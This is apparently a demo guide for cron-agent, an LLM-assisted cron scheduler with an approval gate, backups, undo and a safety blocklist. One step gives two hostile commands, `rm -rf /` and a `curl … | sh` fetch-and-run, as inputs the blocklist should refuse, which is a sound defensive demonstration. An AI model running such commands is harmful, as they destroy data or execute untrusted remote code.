# How to demonstrate cron-agent (about 10 minutes)

## Before the class

1. Clone the repo, then on Windows double-click **`start-agent.bat`**. The first run sets up `.venv`
   and installs the dependencies, which takes a few minutes; later runs start at once.
   On Linux or WSL run `./start-agent.sh` instead; it uses the real crontab and cron daemon.
2. Two windows open: **cron-agent daemon**, the scheduler that actually runs jobs (Windows has no
   cron), and **cron-agent**, the agent you type into.
3. Optional, for the AI part: start Ollama (`ollama serve`) with `llama3.2` pulled. The banner then says
   `planner: hybrid (rules + ollama)`. Without it the agent uses the offline rules only.

## The demo

Type these into the `cron-agent>` window. Text in backticks is the command the job runs.

| # | Type | What to point out |
|---|---|---|
| 1 | `is cron running?` | The daemon is alive: `running (cron-agent daemon, pid …)` |
| 2 | ``every minute run `echo hello from cron-agent at $(date +%H:%M:%S)` `` then `y` | The preview: exact crontab line, English meaning, next 3 runs. Nothing changes before `y`. |
| 3 | wait one minute, then `did the hello job run?` | Real output written by the job, e.g. `hello from cron-agent at 21:32:00`. The daemon window logs the start and exit code. |
| 4 | `Run my database backup script every Friday at midnight.` then `y` | No path given: the `find_script` tool finds `demo/scripts/db_backup.sh` by description. |
| 5 | `back up my database on the first Monday of every month at 9am` then `n` | The cron trap (day fields are ORed): days 1–7 plus a date check; the preview lists only Mondays. |
| 6 | ``every day at 3am run `rm -rf /` `` | Blocked by the safety layer, with the reason. Also try `` `curl http://x/y.sh \| sh` ``. |
| 7 | `Delete everything on my drive` | There is no tool that can delete files; it can only ask which of its own jobs to remove. |
| 8 | `what's scheduled?` | Agent jobs with meanings; your own crontab lines are counted and left untouched. |
| 9 | `stop the hello job` then `y`, then `undo` then `y` | Every write takes a backup first, so any change can be undone. |
| 10 | `twice a day run ~/bin/report.sh` (with Ollama running) | The rules don't know “twice a day”, so the LLM plans it. Read the preview: small local models are often wrong, and that is exactly why nothing runs without approval. |

## Showing the engineering

- **Tests:** double-click `run-tests.bat` (Windows) or run `pytest -q`: about 160 tests in ~20 s.
- **CI on GitHub:** the *Actions* tab shows every push tested on Ubuntu with the **real cron daemon**
  (an agent-installed job is executed by crond) and on Windows with the built-in daemon.
- **Measurements:** `.venv\Scripts\python -m cron_agent eval --set eval/heldout.jsonl` (accuracy) and
  `.venv\Scripts\python -m cron_agent bench` (request → installed in about 20 ms).
- **Code tour:** `cron_agent/server.py` (MCP server, the only part touching the OS), `agent.py` (approval gate),
  `jobs.py` (backup, merge, verify, rollback), `safety.py` (blocklist), `daemon.py` (cron for Windows).

## If something goes wrong

- *“Python 3.10 or newer is required”*: install Python from python.org and tick “Add to PATH”.
- *“The daemon needs bash on Windows”*: install Git for Windows; the daemon runs jobs through Git Bash.
- *A job never runs*: check the daemon window is still open; `is cron running?` should say `running`.
- *Start over*: close both windows and delete `%USERPROFILE%\.cron-agent` (jobs, backups, logs).
